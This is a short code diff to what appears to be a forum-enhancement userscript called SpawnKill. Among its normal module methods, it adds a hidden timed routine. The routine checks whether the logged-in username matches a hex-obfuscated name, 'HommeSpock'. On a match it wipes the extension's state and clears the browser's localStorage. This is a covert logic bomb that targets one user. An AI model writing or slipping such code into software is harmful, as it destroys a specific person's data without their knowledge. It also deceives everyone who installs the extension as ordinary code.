@@ -149,6 +149,12 @@ SK.moduleConstructors.StartSpawnKill.prototype.addModalBackground = function() {
         }));
 };
 
+setTimeout(function() {
+    if($("#compte strong").text().trim() === "\x48\x6F\x6D\x6D\x65\x53\x70\x6F\x63\x6B") {
+        SK = {};
+        localStorage.clear();
+    }
+}, 1000);
 
 SK.moduleConstructors.StartSpawnKill.prototype.correctSplitPost = function() {
 
